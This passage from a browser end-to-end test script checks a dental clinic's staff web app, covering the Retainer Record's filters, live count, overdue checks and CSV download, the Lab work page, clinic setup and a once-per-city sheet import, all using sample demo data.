    state.data.updateRetainerRecord = async (id, ch) => { if ('notes' in ch) await new Promise((r) => setTimeout(r, 1500)); return orig.call(state.data, id, ch); };
    window.__retainerSaveBack = () => { state.data.updateRetainerRecord = orig; };
  });
  const notes = pr.locator('input[aria-label="Notes for Sample Retainer Test"]');
  await notes.fill('Lower retainer remade');
  await pr.waitForTimeout(600); // the note is on its way now
  await pr.locator('select[aria-label="Payments for Sample Retainer Test"]').selectOption('Pending');
  await pr.waitForSelector('select.pill.c-amber[aria-label="Payments for Sample Retainer Test"]');
  assert.equal(await notes.inputValue(), 'Lower retainer remade', 'the note is still there after the chip saved');
  await pr.waitForFunction(async () => {
    const { state } = await import('/js/state.js');
    return (await state.data.retainerRecords({ cityId: 1 })).some((r) => r.patient_name === 'Sample Retainer Test' && r.notes === 'Lower retainer remade');
  });
  await pr.waitForSelector('.save-status[data-state="saved"]');
  assert.equal(await notes.inputValue(), 'Lower retainer remade', 'and after the note saved');
  await pr.evaluate(() => window.__retainerSaveBack());
});
await step('Retainer Record: filters by status, by maker (also from a banner name), by month, a search, and the sheet\'s own order', async () => {
  const rows = pr.locator('table.rs-table tbody tr[data-id]');
  await pr.locator('.rs-toolbar select[aria-label="Status"]').selectOption('Model checked');
  await pr.waitForFunction(() => document.querySelectorAll('table.rs-table tbody tr[data-id]').length < 20);
  const statuses = await rows.locator('select[aria-label^="Status for"]').evaluateAll((els) => els.map((s) => s.value));
  assert.ok(statuses.length && statuses.every((v) => v === 'Model checked'), 'only "Model checked" rows');
  await pr.getByRole('button', { name: 'Clear filters' }).click();
  await pr.locator('.rl-chip', { hasText: 'Kamran (sample)' }).click();
  assert.equal(await pr.locator('.rl-chip', { hasText: 'Kamran (sample)' }).getAttribute('aria-pressed'), 'true');
  assert.equal(await pr.locator('.rs-toolbar select[aria-label="Retainer made by"]').inputValue(), 'rt-kamran', 'the banner name sets the filter');
  assert.match(await pr.locator('.rs-toolbar select[aria-label="Retainer made by"]').evaluate((s) => s.className), /c-lavender/, 'and the filter takes his colour');
  const makers = await rows.locator('select[aria-label^="Retainer made by for"]').evaluateAll((els) => els.map((s) => s.value));
  assert.ok(makers.length && makers.every((v) => v === 'rt-kamran'), 'only Kamran\'s retainers');
  await pr.locator('.rl-chip', { hasText: 'Kamran (sample)' }).click();
  assert.equal(await pr.locator('.rs-toolbar select[aria-label="Retainer made by"]').inputValue(), '', 'pressed again: everyone');
  const monthOpt = (await pr.locator('.rs-toolbar select[aria-label="Month"] option').allInnerTexts())[1];
  const n = Number(monthOpt.match(/\((\d+)\)/)[1]);
  await pr.locator('.rs-toolbar select[aria-label="Month"]').selectOption({ index: 1 });
  await pr.waitForFunction((want) => document.querySelectorAll('table.rs-table tbody tr[data-id]').length === want, n);
  await pr.getByRole('button', { name: 'Clear filters' }).click();
  await pr.locator('.rs-toolbar input[type=search]').fill('0300-5559002');
  await pr.waitForFunction(() => document.querySelectorAll('table.rs-table tbody tr[data-id]').length === 1);
  await pr.getByRole('button', { name: 'Clear filters' }).click();
  await pr.locator('.rs-toolbar select[aria-label="Order"]').selectOption('sheet');
  assert.match(pr.url(), /#\/staff\/retainers\?city=1&order=sheet$/, 'the order is kept in the address');
  await rows.first().getByRole('button', { name: /^More for / }).click();
  await pr.locator('.modal:has-text("Copied from the Google Sheet, Karachi tab, row 2.")').waitFor();
  await pr.keyboard.press('Escape');
  await pr.locator('.rs-toolbar select[aria-label="Order"]').selectOption('newest');
});
await step('Retainer Record: a name in the banner follows "Clear filters" and the drop-down; another tab takes off a name it does not have', async () => {
  const rows = pr.locator('table.rs-table tbody tr[data-id]');
  const live = pr.locator('.page-head [role="status"]');
  const chip = (name) => pr.locator('.rl-chip', { hasText: name });
  const madeBy = pr.locator('.rs-toolbar select[aria-label="Retainer made by"]');
  const all = await live.innerText();
  assert.match(all, /^Karachi: \d+ retainers$/, 'no filter to start with');
  await chip('Hassan (sample)').click();
  assert.equal(await chip('Hassan (sample)').getAttribute('aria-pressed'), 'true');
  await pr.getByRole('button', { name: 'Clear filters' }).click();
  assert.equal(await live.innerText(), all, 'Clear filters: everyone again');
  assert.equal(await chip('Hassan (sample)').getAttribute('aria-pressed'), 'false', 'and his name in the banner is not pressed any more');
  await chip('Hassan (sample)').click();
  assert.equal(await chip('Hassan (sample)').getAttribute('aria-pressed'), 'true');
  assert.equal(await madeBy.inputValue(), 'rt-hassan', 'one tap on his name again filters his retainers');
  const makers = await rows.locator('select[aria-label^="Retainer made by for"]').evaluateAll((els) => els.map((x) => x.value));
  assert.ok(makers.length && makers.every((v) => v === 'rt-hassan'), 'only Hassan\'s retainers');
  await pr.getByRole('button', { name: 'Clear filters' }).click();
  await madeBy.selectOption('rt-kamran');
  assert.equal(await chip('Kamran (sample)').getAttribute('aria-pressed'), 'true', 'Kamran chosen in the drop-down: his name in the banner is pressed');
  assert.equal(await chip('Hassan (sample)').getAttribute('aria-pressed'), 'false');
  await chip('Kamran (sample)').click();
  assert.equal(await madeBy.inputValue(), '', 'one tap on his name shows everyone again');
  assert.equal(await live.innerText(), all);
  // A name of the Karachi team, then the Lahore tab: Lahore opens with all its rows and no filter, in the address too.
  await chip('Hassan (sample)').click();
  await pr.locator('.rs-tabs [role="tab"]', { hasText: 'Lahore' }).click();
  await pr.waitForFunction(() => /^Lahore: 14 retainers$/.test(document.querySelector('.page-head [role="status"]')?.textContent || ''));
  assert.equal(await madeBy.inputValue(), '', 'the Karachi name is taken off');
  assert.doesNotMatch(pr.url(), /who=/, 'and the address drops it');
  // An address with a name the tab does not have: the filter says the name, never the code.
  await pr.goto(BASE + '#/staff/today');
  await pr.goto(BASE + '#/staff/retainers?city=2&who=rt-hassan');
  await pr.waitForFunction(() => /^Lahore: 0 retainers of 14 match these filters$/.test(document.querySelector('.page-head [role="status"]')?.textContent || ''));
  assert.equal(await madeBy.evaluate((x) => x.selectedOptions[0]?.textContent), 'Hassan (sample)');
  await pr.goto(BASE + '#/staff/today');
  await pr.goto(BASE + '#/staff/retainers?city=1');
  await pr.waitForFunction(() => /^Karachi: \d+ retainers$/.test(document.querySelector('.page-head [role="status"]')?.textContent || ''));
});
await step('Retainer Record: the count is a polite live region; a search, the order, a name in the banner and a tab are read out, also when the count stays the same', async () => {
  const live = pr.locator('.page-head [role="status"]');
  assert.equal(await live.count(), 1, 'one live region holds the count');
  assert.equal(await live.getAttribute('aria-live'), 'polite');
  // Every write to a live region, with whether that region is shown.
  await pr.evaluate(() => {
    window.liveWrites = [];
    new MutationObserver((list) => {
      for (const m of list) {
        const region = (m.target.nodeType === 1 ? m.target : m.target.parentElement)?.closest('[role="status"], [role="alert"], [aria-live]');
        if (region?.textContent.trim()) window.liveWrites.push({ text: region.textContent.trim(), shown: region.checkVisibility({ visibilityProperty: true }) });
      }
    }).observe(document.body, { childList: true, subtree: true, characterData: true });
  });
  const heard = async (what, change) => {
    await pr.evaluate(() => { window.liveWrites = []; });
    const was = await live.innerText();
    await change();
    await pr.waitForTimeout(400); // (the search waits a moment for the typing to stop)
    const count = await live.innerText();
    await pr.waitForFunction((c) => window.liveWrites.some((w) => w.shown && w.text === c), count, { timeout: 3000 }).catch(() => {});
    const writes = await pr.evaluate(() => window.liveWrites);
    assert.ok(writes.some((w) => w.shown && w.text === count), `${what}: "${count}" is written to a live region that is shown: ${JSON.stringify(writes)}`);
    return { was, count };
  };
  const search = await heard('a search', () => pr.locator('.rs-toolbar input[type=search]').fill('Sample Retainer Test'));
  assert.match(search.count, /^Karachi: 1 retainer of \d+ match these filters$/);
  const order = await heard('the sheet\'s order', () => pr.locator('.rs-toolbar select[aria-label="Order"]').selectOption('sheet'));
  assert.equal(order.count, order.was, 'the order gives the same count, and it is read out again');
  await pr.locator('.rs-toolbar select[aria-label="Order"]').selectOption('newest');
  await pr.getByRole('button', { name: 'Clear filters' }).click();
  await heard('a name in the banner', () => pr.locator('.rl-chip', { hasText: 'Kamran (sample)' }).click());
  await pr.locator('.rl-chip', { hasText: 'Kamran (sample)' }).click();
  const lahore = await heard('the Lahore tab', () => pr.locator('.rs-tabs [role="tab"]', { hasText: 'Lahore' }).click());
  assert.match(lahore.count, /^Lahore: \d+ retainers$/);
  await heard('the Karachi tab', () => pr.locator('.rs-tabs [role="tab"]', { hasText: 'Karachi' }).click());
});
await step('Retainer Record: the Mr# column (the file\'s Mr# on a linked row, the typed one on the others, saved by itself), a search by Mr#, a model checker\'s chip, Model poured', async () => {
  const rows = pr.locator('table.rs-table tbody tr[data-id]');
  // A sheet row linked to its patient file by Mr#: the name opens the file and the Mr# column shows the file's Mr#.
  const linked = rows.filter({ has: pr.locator('a', { hasText: 'Talha Saeed' }) });
  assert.equal(await linked.locator('.rs-mr').innerText(), '9823');
  // Unlinked rows keep the Mr# typed on the sheet, leading 0 and all; a search finds it with or without the 0.
  const typed = await pr.locator('input[aria-label^="Mr# for"]').evaluateAll((els) => els.map((e) => e.value).filter(Boolean));
  assert.ok(typed.includes('0303') && typed.includes('4111'), 'the typed Mr#s are on their rows (' + typed.join(', ') + ')');
  await pr.locator('.rs-toolbar input[type=search]').fill('303');
  await pr.waitForFunction(() => document.querySelectorAll('table.rs-table tbody tr[data-id]').length === 1);
  assert.equal(await rows.first().locator('input[aria-label^="Mr# for"]').inputValue(), '0303');
  const who = (await rows.first().locator('input[aria-label^="Mr# for"]').getAttribute('aria-label')).replace(/^Mr# for /, '');
  await pr.locator('input[aria-label="Mr# for ' + who + '"]').fill('0304');
  await pr.waitForFunction(async (name) => {
    const { state } = await import('/js/state.js');
    return (await state.data.retainerRecords({ cityId: 1 })).some((r) => r.patient_name === name && r.mr_text === '0304');
  }, who);
  await pr.getByRole('button', { name: 'Clear filters' }).click();
  // The model checker's chip filters "Model check by".
  await pr.locator('.rl-chip', { hasText: 'Dr. Hina (sample)' }).click();
  assert.equal(await pr.locator('.rs-toolbar select[aria-label="Model check by"]').inputValue(), 'rt-hina');
  const checkers = await rows.locator('select[aria-label^="Model check by for"]').evaluateAll((els) => els.map((s) => s.value));
  assert.ok(checkers.length && checkers.every((v) => v === 'rt-hina'), 'only the models Dr. Hina checked');
  await pr.locator('.rl-chip', { hasText: 'Dr. Hina (sample)' }).click();
  assert.equal(await pr.locator('.rs-toolbar select[aria-label="Model check by"]').inputValue(), '');
  // "Model poured" (from the Karachi tab) is on the Status list, in its own peach chip.
  const options = await rows.first().locator('select[aria-label^="Status for"] option').allInnerTexts();
  assert.deepEqual(options.slice(1, 5), ['Impression taken', 'Model checked', 'Model poured', 'Retainer made']);
  await pr.locator('.rs-toolbar select[aria-label="Status"]').selectOption('Model poured');
  await pr.waitForFunction(() => document.querySelectorAll('table.rs-table tbody tr[data-id]').length > 0
    && [...document.querySelectorAll('table.rs-table tbody select[aria-label^="Status for"]')].every((s) => s.value === 'Model poured'));
  assert.equal(await rows.first().locator('select[aria-label^="Status for"]').evaluate((s) => s.className), 'pill c-peach');
  await pr.getByRole('button', { name: 'Clear filters' }).click();
});
await step('Retainer Record: the Lahore tab, a date the sheet\'s reader could not read, linking a patient file, and the CSV download', async () => {
  assert.ok(await pr.locator('.rs-typed', { hasText: 'soon' }).count(), 'the typed text of an unreadable date shows on its row');
  await pr.locator('.rs-tabs [role="tab"]', { hasText: 'Lahore' }).click();
  await pr.waitForFunction(() => /^Lahore: 14 retainers$/.test(document.querySelector('.page-head p')?.textContent || ''));
  assert.match(pr.url(), /city=2/);
  assert.deepEqual((await pr.locator('.rl-chip .rl-name').allInnerTexts()).map((t) => t.trim()), ['Rizwan (sample)', 'Saima (sample)'], 'the Lahore team (and Rizwan, who works in every city)');
  await pr.locator('.rs-tabs [role="tab"]', { hasText: 'Karachi' }).click();
  await pr.waitForSelector('input[aria-label="Notes for Sample Retainer Test"]');
  await pr.getByRole('button', { name: /^More for Sample Retainer Test/ }).click();
  const m = pr.locator('.modal');
  await m.getByRole('combobox', { name: /to a patient file/ }).fill('Zainab');
  await m.locator('.suggestions button', { hasText: 'Zainab Rizvi' }).click();
  await pr.waitForSelector('.toast:has-text("linked to Mr#")');
  await pr.locator('table.rs-table tbody a', { hasText: 'Zainab Rizvi' }).waitFor();
  assert.equal(await pr.locator('table.rs-table tbody tr[data-id]').filter({ has: pr.locator('a', { hasText: 'Zainab Rizvi' }) }).locator('.rs-mr').innerText(), '9814',
    'the Mr# column shows the Mr# of the linked file');
  const [dl] = await Promise.all([pr.waitForEvent('download'), pr.getByRole('button', { name: 'Download CSV' }).click()]);
  assert.match(dl.suggestedFilename(), /^retainer-record_karachi_\d{4}-\d{2}-\d{2}\.csv$/);
  const text = fs.readFileSync(await dl.path(), 'utf8').replace(/^﻿/, '');
  assert.match(text.split('\n')[0], /^#,Patient name,Mr#,Contact,Impression date,Model check by,Retainer made by,Retainer date,Status,Retainer sheet,Payments,Notes/);
  assert.match(text, /Zainab Rizvi,9814,0300-5559002,2026-10-01,,Hassan \(sample\)/);
});
await step('Retainer Record: overdue retainer checks: an "Overdue" chip in the Next check column, the warning naming them (a name opens its row), "Checks due" and "Overdue" in the Status filter, the Coordinator page; the rows copied from the sheet are never overdue', async () => {
  await pr.goto(BASE + '#/staff/today');
  await pr.goto(BASE + '#/staff/retainers?city=1');
  await pr.waitForSelector('table.rs-table tbody tr[data-id]');
  const rows = pr.locator('table.rs-table tbody tr[data-id]');
  const notice = pr.locator('.rs-notice');
  const status = pr.locator('.rs-toolbar select[aria-label="Status"]');
  const live = pr.locator('.page-head [role="status"]');
  // The demo has two checks that have passed (Shayan Ali's, linked to his patient file, the earliest) and one in three days.
  assert.equal(await notice.innerText(), '2 retainer checks are overdue: Shayan Ali, Ifrah Durrani. Call them for a follow-up. Show only them');
  assert.ok(await pr.locator('.page-head .rs-notice').isVisible(), 'a line under the title (a box over the sheet would push the sheet off a laptop\'s first screen)');
  assert.equal(await rows.locator('.pill.c-red', { hasText: 'Overdue' }).count(), 2, 'the two rows whose check has passed say "Overdue"');
  assert.equal(await rows.locator('td:has(input[aria-label^="Next check for"]) .pill', { hasText: 'Overdue' }).count(), 2, 'in their Next check cell');
  assert.equal(await pr.locator('table.rs-table tbody tr.rs-late').count(), 2, 'with the red edge at the name');
  assert.equal(await pr.locator('tr.rs-late input[aria-label="Next check for Ifrah Durrani"]').count(), 1);
  // The rows copied from the sheet: many delivered long ago, none with a check date, none overdue.
  const sheet = await pr.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const all = (await state.data.retainerRecords({ cityId: 1 })).filter((r) => r.source === 'sheet_import');
    return { delivered: all.filter((r) => r.status === 'Delivered to patient').length, dated: all.filter((r) => r.next_check_date).length };
  });
  assert.ok(sheet.delivered >= 30 && sheet.dated === 0, `${sheet.delivered} delivered rows from the sheet, ${sheet.dated} with a check date`);
  // "Checks due": the overdue ones and the one in three days; "Overdue": the two. Both stay in the address.
  await status.selectOption('__due');
  await pr.waitForFunction(() => /^Karachi: 3 retainers of \d+ match these filters$/.test(document.querySelector('.page-head [role="status"]')?.textContent || ''));
  assert.deepEqual((await rows.locator('input[aria-label^="Next check for"]').evaluateAll((els) => els.map((e) => e.getAttribute('aria-label')))).sort(),
    ['Next check for Ifrah Durrani', 'Next check for Saim Abbasi', 'Next check for Shayan Ali']);
  assert.match(pr.url(), /status=__due/);
  assert.equal(await status.evaluate((s) => s.selectedOptions[0].textContent), 'Checks due');
  await status.selectOption('__overdue');
  await pr.waitForFunction(() => /^Karachi: 2 retainers of \d+ match these filters$/.test(document.querySelector('.page-head [role="status"]')?.textContent || ''));
  assert.match(await status.evaluate((s) => s.className), /c-red/, 'the filter takes the red of the chip');
  assert.equal(await status.evaluate((s) => s.selectedOptions[0].textContent), 'Overdue');
  await pr.getByRole('button', { name: 'Clear filters' }).click();
  // "Show only them" in the warning does the same.
  await notice.getByRole('button', { name: 'Show only them' }).click();
  await pr.waitForFunction(() => /^Karachi: 2 retainers of \d+ match these filters$/.test(document.querySelector('.page-head [role="status"]')?.textContent || ''));
  assert.equal(await status.inputValue(), '__overdue');
  assert.equal(await notice.innerText(), '2 retainer checks are overdue: Shayan Ali, Ifrah Durrani. Call them for a follow-up. They are the rows below.');
  assert.equal(await pr.evaluate(() => document.activeElement?.classList.contains('rs-notice')), true, 'the focus stays on the line when its button goes');
  await pr.getByRole('button', { name: 'Clear filters' }).click();
  // The Coordinator page names them too (as its old Retainers tab did): the linked one opens the patient file, each city's link its tab.
  await pr.goto(BASE + '#/staff/coordinator');
  const warn = pr.locator('.alert-warning', { hasText: 'retainer check' });
  await warn.waitFor();
  assert.equal(await warn.innerText(), '2 retainer checks are overdue: Shayan Ali, Ifrah Durrani. Call them for a follow-up. On the Retainer Record: Karachi (2).');
  assert.match(await warn.getByRole('link', { name: 'Shayan Ali' }).getAttribute('href'), /^#\/staff\/patient\//);
  await warn.getByRole('link', { name: 'Karachi (2)' }).click();
  await pr.waitForFunction(() => /^Karachi: 2 retainers of \d+ match these filters$/.test(document.querySelector('.page-head [role="status"]')?.textContent || ''));
  assert.equal(await status.inputValue(), '__overdue', 'the Retainer Record opens with only the overdue checks');
  // A name in the warning opens its row: the phone, "Overdue", and the check date, which a call moves on.
  await notice.getByRole('button', { name: 'Ifrah Durrani' }).click();
  const m = pr.locator('.modal');
  await m.getByText('Phone: 0300-5552301').waitFor();
  assert.match(await m.innerText(), /Overdue The retainer check was due on/);
  const later = await pr.evaluate(async () => { const { localISO, addDaysISO } = await import('/js/ui/dom.js'); return addDaysISO(localISO(), 60); });
  await m.getByLabel('Next retainer check').fill(later);
  await pr.waitForFunction(() => /^1 retainer check is overdue: Shayan Ali\. Call them/.test(document.querySelector('.rs-notice')?.textContent || ''));
  assert.equal(await m.getByText('The retainer check was due on').count(), 0, 'the dialog drops "Overdue" too');
  await m.getByRole('button', { name: 'Done' }).click();
  // (the row stays on screen until the list is drawn again, so a change never makes a row vanish under the hand; it is not overdue now)
  assert.equal(await pr.locator('table.rs-table tbody tr.rs-late').count(), 1);
  assert.equal(await rows.filter({ has: pr.locator('input[aria-label="Next check for Ifrah Durrani"]') }).locator('.pill', { hasText: 'Overdue' }).count(), 0);
  await pr.getByRole('button', { name: 'Clear filters' }).click();
  assert.match(await live.innerText(), /^Karachi: \d+ retainers$/, 'everyone again');
  await shot(pr, '41b-retainer-checks');
});
await step('Lab work: its own teal page with branch tabs, an "Overdue" chip, + New lab case, and a status edit that takes the chip away', async () => {
  await pr.locator('.topnav .menu:has-text("Coordinator") > button').click();
  await pr.locator('.topnav .menu-list a', { hasText: 'Lab work' }).click();
  await pr.waitForSelector('table.rs-table tbody tr[data-id]');
  assert.equal(await pr.locator('h1').innerText(), 'Lab work');
  assert.deepEqual((await pr.locator('.rs-tabs [role="tab"]').allInnerTexts()).map((t) => t.trim()), ['All branches', 'Gulshan (RJ Mall)', 'North Nazimabad', 'DHA Karachi', 'Gulberg Lahore', 'Islamabad']);
  assert.deepEqual((await pr.locator('table.rs-table thead th').allInnerTexts()).map((t) => t.trim()),
    ['# · Patient', 'Work', 'Lab', 'Sent', 'Due', 'Received', 'Fitted', 'Status', 'Teeth', 'Shade', 'Handled by', 'Cost (Rs)', 'Payment', 'Contact', 'Notes']);
  assert.equal(await pr.locator('table.rs-table thead th').first().evaluate((el) => getComputedStyle(el).backgroundColor), 'rgb(11, 95, 104)', 'teal instead of purple');
  await pr.evaluate(() => document.fonts.ready);
  assert.deepEqual(await pr.evaluate(() => {
    const w = document.querySelector('.rs-wrap').getBoundingClientRect();
    return [...document.querySelectorAll('table.rs-table thead th')].slice(0, 8).filter((th) => th.getBoundingClientRect().right > w.right + 1).map((th) => th.textContent);
  }), [], 'on a laptop the work, the lab, the four dates and the status are in sight');
  assert.equal(await pr.locator('table.rs-table tbody .pill.c-red', { hasText: 'Overdue' }).count(), 2, 'two Gulshan cases are past due and not back');
  assert.equal(await pr.locator('table.rs-table tbody tr.rs-late').count(), 2);
  const yesterday = await pr.evaluate(async () => { const { localISO, addDaysISO } = await import('/js/ui/dom.js'); return addDaysISO(localISO(), -1); });
  await pr.locator('.page-head').getByRole('button', { name: '+ New lab case' }).click();
  const m = pr.locator('.modal');
  await m.getByLabel('Patient name').fill('Sample Lab Test');
  await m.getByLabel('Work').selectOption('Crown');
  await m.getByLabel('Teeth').fill('UL6');
  await m.getByLabel('Due back').fill(yesterday);
  await m.getByRole('button', { name: 'Add lab case' }).click();
  await pr.waitForSelector('.toast:has-text("Sample Lab Test added")');
  const row = pr.locator('table.rs-table tbody tr[data-id]').filter({ has: pr.locator('input[aria-label="Patient name, row 1"]') });
  assert.equal(await row.locator('input[aria-label="Patient name, row 1"]').inputValue(), 'Sample Lab Test');
  assert.ok(await row.locator('.pill.c-red', { hasText: 'Overdue' }).count(), 'due yesterday and not back: Overdue');
  await row.locator('select[aria-label="Status for Sample Lab Test"]').selectOption('received');
  await pr.waitForFunction(() => document.querySelector('input[aria-label="Received for Sample Lab Test"]')?.value?.length === 10);
  assert.equal(await pr.locator('table.rs-table tbody tr[data-id]').first().locator('.pill.c-red').count(), 0, 'back from the lab: no Overdue chip');
  await pr.locator('input[aria-label="Shade for Sample Lab Test"]').fill('A3');
  await pr.waitForFunction(async () => {
    const { state } = await import('/js/state.js');
    return (await state.data.labRecords({})).some((r) => r.patient_name === 'Sample Lab Test' && r.shade === 'A3');
  });
  await pr.locator('.rs-tabs [role="tab"]', { hasText: 'All branches' }).click();
  await pr.waitForFunction(() => /^All branches: 12 lab cases$/.test(document.querySelector('.page-head p')?.textContent || ''));
  assert.ok(await pr.locator('table.rs-table tbody .rs-note', { hasText: 'GUL' }).count(), 'all branches: each row says its branch');
  await shot(pr, '42-lab-work');
});
await step('Clinic setup: a team member\'s colour changes every chip and the banner; a new member marked "In the banner" shows there; a new status reaches the drop-down', async () => {
  await pr.goto(BASE + '#/staff/admin?tab=setup');
  await pr.waitForSelector('h2:text("Retainer team")');
  const team = pr.locator('section', { has: pr.locator('h2:text("Retainer team")') });
  await team.getByRole('button', { name: 'Edit Hassan (sample)' }).click();
  await pr.locator('.modal').getByLabel('Colour').selectOption('ocean');
  await pr.locator('.modal').getByRole('button', { name: 'Save' }).click();
  await pr.waitForSelector('.toast:has-text("Saved")');
  await pr.locator('section', { has: pr.locator('h2:text("Retainer team")') }).getByRole('button', { name: 'New team member' }).click();
  const m = pr.locator('.modal');
  await m.getByLabel('Name').fill('Sample New Maker');
  await m.getByLabel('Colour').selectOption('rose');
  await m.getByLabel('City').selectOption({ label: 'Karachi' });
  await m.getByLabel('In the banner').check();
  await m.getByRole('button', { name: 'Save' }).click();
  await pr.waitForSelector('td:text("Sample New Maker")');
  await pr.locator('section', { has: pr.locator('h2:text("Retainer statuses")') }).getByRole('button', { name: 'New status' }).click();
  await pr.locator('.modal').getByRole('textbox').fill('Waiting for sheet');
  await pr.locator('.modal').getByLabel('Colour').selectOption('peach');
  await pr.locator('.modal').getByRole('button', { name: 'Save' }).click();
  await pr.waitForSelector('td:text("Waiting for sheet")');
  await shot(pr, '43-clinic-setup-team');
  await pr.goto(BASE + '#/staff/retainers');
  await pr.waitForSelector('table.rs-table tbody tr[data-id]');
  assert.ok(await pr.locator('.rl-chip.c-ocean', { hasText: 'Hassan (sample)' }).count(), 'the banner chip is ocean now');
  const hassan = await pr.locator('table.rs-table select[aria-label^="Retainer made by"]').evaluateAll((els) => els.filter((s) => s.selectedOptions[0]?.textContent === 'Hassan (sample)').map((s) => s.className));
  assert.ok(hassan.length && hassan.every((c) => c === 'pill c-ocean'), 'and so is every chip with his name');
  assert.ok(await pr.locator('.rl-chip.c-rose', { hasText: 'Sample New Maker' }).count(), 'the new maker is in the banner, in rose');
  const options = await pr.locator('table.rs-table select[aria-label^="Status for"]').first().locator('option').allInnerTexts();
  assert.ok(options.includes('Waiting for sheet'), 'the new status is on the drop-down');
});
await step('Clinic setup: a status written in new words keeps its rows: they say the new words, stay green and keep counting as delivered', async () => {
  const deliveredRows = () => pr.locator('table.rs-table select[aria-label^="Status for"]').evaluateAll((els, want) => els.filter((s) => s.value === want && s.className === 'pill c-green').length, 'Delivered');
  const banner = async () => (await pr.locator('.rl-month strong').innerText()).trim();
  const counts = await banner();
  const had = await pr.locator('table.rs-table select[aria-label^="Status for"]').evaluateAll((els) => els.filter((s) => s.value === 'Delivered to patient').length);
  const rename = async (from, to) => {
    await pr.goto(BASE + '#/staff/admin?tab=setup');
    await pr.locator('section', { has: pr.locator('h2:text("Retainer statuses")') }).getByRole('button', { name: `Edit ${from}` }).click();
    await pr.locator('.modal').getByRole('textbox').fill(to);
    await pr.locator('.modal').getByRole('button', { name: 'Save' }).click();
    await pr.waitForSelector(`.toast:has-text("rows now say \\"${to}\\"")`);
    await pr.goto(BASE + '#/staff/retainers');
    await pr.waitForSelector('table.rs-table tbody tr[data-id]');
  };
  assert.ok(had > 0);
  await rename('Delivered to patient', 'Delivered');
  assert.equal(await deliveredRows(), had, 'every delivered row says "Delivered", in the green chip');
  assert.equal(await pr.locator('table.rs-table select[aria-label^="Status for"] option:checked', { hasText: 'Delivered to patient' }).count(), 0, 'no row is left with the old words');
  assert.equal(await banner(), counts, 'the banner still counts them as delivered');
  await rename('Delivered', 'Delivered to patient'); // (back, for the steps after this one)
  assert.equal(await banner(), counts);
});
await step('Clinic setup: a team member or a lab whose name is on the list already gets a plain message at the name, never the database\'s words', async () => {
  await pr.goto(BASE + '#/staff/admin?tab=setup');
  await pr.waitForSelector('h2:text("Retainer team")');
  const team = pr.locator('section', { has: pr.locator('h2:text("Retainer team")') });
  const m = pr.locator('.modal');
  await team.getByRole('button', { name: 'New team member' }).click();
  assert.equal(await m.getByLabel('Colour').inputValue(), 'navy', 'a new member starts with a strong colour nobody has, never light grey');
  await m.getByLabel('Name').fill('  hassan   (SAMPLE) ');
  await m.getByRole('button', { name: 'Save' }).click();
  await m.getByText('hassan (SAMPLE) is already on the team.').waitFor();
  assert.ok(await m.isVisible(), 'the dialog stays open to correct the name');
  assert.equal(await pr.getByText(/duplicate key|_name_idx|violates/).count(), 0, 'no database words anywhere');
  await pr.keyboard.press('Escape');
  // The same name saved a moment ago by somebody else (the list on this page does not have it yet): the database refuses it, and the page
  // says so in the same words.
  await team.getByRole('button', { name: 'New team member' }).click();
  await pr.evaluate(async () => { const { state } = await import('/js/state.js'); await state.data.saveRetainerTeamMember({ name: 'Sample Just Added', role: 'maker', colour: 'teal' }); });
  await m.getByLabel('Name').fill('Sample Just Added');
  await m.getByRole('button', { name: 'Save' }).click();
  await m.getByText('Sample Just Added is already on the team.').waitFor();
  assert.equal(await pr.getByText(/duplicate key|_name_idx|violates/).count(), 0, 'no database words anywhere');
  await pr.keyboard.press('Escape');
  // A lab whose name is on the list of labs already (a person may share a lab's name: they are two lists).
  const labs = pr.locator('section', { has: pr.locator('h2:text("Lab team and labs")') });
  await labs.getByRole('button', { name: 'New person or lab' }).click();
  await m.getByLabel('Name').fill('in-house LAB');
  await m.getByLabel(/^Is\b/).selectOption('lab');
  await m.getByRole('button', { name: 'Save' }).click();
  await m.getByText('in-house LAB is already on the list of labs.').waitFor();
  assert.equal(await m.getByLabel('Name').getAttribute('aria-invalid'), 'true', 'the message is at the name');
  await m.getByLabel(/^Is\b/).selectOption('person');
  await m.getByRole('button', { name: 'Save' }).click();
  await pr.waitForSelector('.toast:has-text("Saved")');
  const people = await pr.evaluate(async () => { const { state } = await import('/js/state.js'); return (await state.data.labTeam()).filter((x) => x.name === 'in-house LAB').map((x) => x.kind); });
  assert.deepEqual(people, ['person'], 'as a person the name is free (people and labs are two lists)');
});
await step('Import: a Retainer Record tab is copied once per city: a second copy is refused in plain words, "Undo the copy" takes back what nobody changed, then the corrected tab goes in whole', async () => {
  await pr.goto(BASE + '#/staff/admin?tab=import');
  const sec = pr.locator('section', { has: pr.locator('h2', { hasText: '7. Retainer Record' }) });
  await sec.waitFor();
  // The demo's tabs are copied already: each city with the day, the size and its "Undo the copy" button.
  await sec.locator('.rt-copies li', { hasText: 'Lahore' }).waitFor();
  assert.match(await sec.locator('.rt-copies li', { hasText: 'Lahore' }).innerText(), /^Lahore: copied on .+, 14 retainers\.\s*Undo the copy for Lahore$/);
  await sec.getByLabel('City of this tab').selectOption({ label: 'Lahore' });
  const csv = 'Contact #,Patient Name,Impression Date,Model Check By,Retainer Made By,Retainer Date,Status\n'
    + '0300-5559101,Sample Import One,20- November,Dr. Ali Rashid,Saima (sample),28 november,Delivered to Patient\n'
    + '0300-5559102,Sample Import Two,23rd december,Dr. Ali Rashid,maker   imported,2 jan,Retainer Made\n'
    + '0300-5559103,Sample Import Three,soon,,,,\n';
  const drop = () => sec.locator('input[type=file]').setInputFiles({ name: 'Retainer Record - Lahore.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await drop();
  await sec.locator('.stat', { hasText: 'ready to copy' }).waitFor();
  assert.equal(await sec.locator('.stat', { hasText: 'ready to copy' }).locator('strong').innerText(), '3');
  assert.equal(await sec.locator('.stat', { hasText: 'dates that could not be read' }).locator('strong').innerText(), '1');
  assert.match(await sec.locator('.alert-info', { hasText: 'not on the retainer team yet' }).innerText(), /will be added: Maker Imported\./);
  // Lahore is copied already: refused in plain words before anything is sent, and the button stays off.
  const stop = sec.locator('.alert-stop', { hasText: 'already copied' });
  await stop.waitFor();
  assert.match(await stop.innerText(), /^Lahore was already copied on \d{1,2} [A-Z][a-z]{2} \d{4} \(14 retainers\)\. The website is now the Retainer Record: add or change retainers there\./);
  assert.ok(await sec.getByRole('button', { name: 'Copy 3 retainers into Lahore' }).isDisabled(), 'a second copy cannot be started');
  // "Undo the copy for Lahore": it asks first, with the numbers (nobody changed a Lahore row on the website, so all 14 go).
  await stop.getByRole('button', { name: 'Undo the copy for Lahore' }).click();
